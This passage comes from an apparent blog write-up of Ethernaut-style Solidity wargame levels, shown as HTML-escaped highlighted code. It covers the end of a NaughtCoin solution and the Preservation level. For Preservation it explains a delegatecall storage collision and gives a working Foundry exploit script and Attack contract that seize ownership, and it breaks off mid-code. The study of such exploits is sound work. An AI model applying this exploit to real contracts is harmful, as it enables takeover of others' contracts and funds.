style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(naughtCoin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(_player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;naughtCoin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(_player))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Transfer to Atacker Failed&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;NaughtCoinSolve.s.sol:NaughtCoinSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;16-preservation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#16-preservation&quot; aria-label=&quot;Anchor link for: 16-preservation&quot;&gt;16 Preservation&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Preservation.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Preservation {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; public library contracts 
&lt;&#x2F;span&gt;&lt;span&gt;  address public timeZone1Library&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  address public timeZone2Library&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;  uint storedTime&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Sets the function signature for delegatecall
&lt;&#x2F;span&gt;&lt;span&gt;  bytes4 constant setTimeSignature &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes4&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;setTime(uint256)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address _timeZone1LibraryAddress&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;address _timeZone2LibraryAddress) {
&lt;&#x2F;span&gt;&lt;span&gt;    timeZone1Library &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_timeZone1LibraryAddress&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;    timeZone2Library &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_timeZone2LibraryAddress&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; set the time for timezone 1
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setFirstTime&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint _timeStamp&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    timeZone1Library&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(setTimeSignature&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_timeStamp))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; set the time for timezone 2
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setSecondTime&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint _timeStamp&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    timeZone2Library&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(setTimeSignature&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_timeStamp))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Simple library contract to set the time
&lt;&#x2F;span&gt;&lt;span&gt;contract LibraryContract {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; stores a timestamp 
&lt;&#x2F;span&gt;&lt;span&gt;  uint storedTime&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;  
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setTime&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint _time&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    storedTime &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_time&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;The goal of this level is for you to claim ownership of the instance you are given.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Preservation contract uses LibraryContract to set the time in the Preservation contract by using &lt;code&gt;delegatecall&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;As we know &lt;code&gt;delegatecall&lt;&#x2F;code&gt; runs the call in the context of the calle contract and updates the storage of the caller contract.&lt;&#x2F;li&gt;
&lt;li&gt;So, the caller and callee contract storage layout should be matched. If not it may result in storage collision bugs.&lt;&#x2F;li&gt;
&lt;li&gt;Here the Preservation contract doesn&#x27;t matches the LibraryContract storage layout.&lt;&#x2F;li&gt;
&lt;li&gt;I observed that calling &lt;code&gt;setSecondTime&lt;&#x2F;code&gt; updates the &lt;code&gt;timeZone1Library&lt;&#x2F;code&gt; address in the Preservation contract.&lt;&#x2F;li&gt;
&lt;li&gt;By exploiting this we can write our own attacker contract that implements the &lt;code&gt;setTime()&lt;&#x2F;code&gt; function and pass that address to the &lt;code&gt;setSecondTime()&lt;&#x2F;code&gt; function so that it will updte the &lt;code&gt;timeZone1Library&lt;&#x2F;code&gt; address in the Preservation contract.&lt;&#x2F;li&gt;
&lt;li&gt;I implemented the Attack contract in such a way that it matches the Preservation storage layout and instead of updating the &lt;code&gt;stiredTime&lt;&#x2F;code&gt; i updated the &lt;code&gt;owner&lt;&#x2F;code&gt;. And that makes our attack contract as the owner of the Preservation contract.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;PreservationSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Preservation} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Preservation.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract PreservationSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Preservation public preservation &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Preservation&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x67403A5bC365868E3f9800c6308ca3623Bb1e446&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;timeZone1Library Address : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;preservation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;timeZone1Library&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;timeZone2Library Address : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;preservation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;timeZone2Library&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;preservation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attack Address : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(attack))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        attack&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;timeZone1Library Address : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;preservation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;timeZone1Library&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;timeZone2Library Address : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;preservation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;timeZone2Library&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;preservation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; matching Preservation Storage Layout
&lt;&#x2F;span&gt;&lt;span&gt;    address public timeZone1Library&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address public timeZone2Library&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
&lt;&#x2F;span&gt;&lt;span&gt;    uint storedTime&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        Preservation preservation &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Preservation&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x67403A5bC365868E3f9800c6308ca3623Bb1e446&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        uint attacker &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint160&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        preservation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setSecondTime&lt;&#x2F;span&gt;&lt;span&gt;(attacker)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; updating timeZone1Library address;
&lt;&#x2F;span&gt;&lt;span&gt;
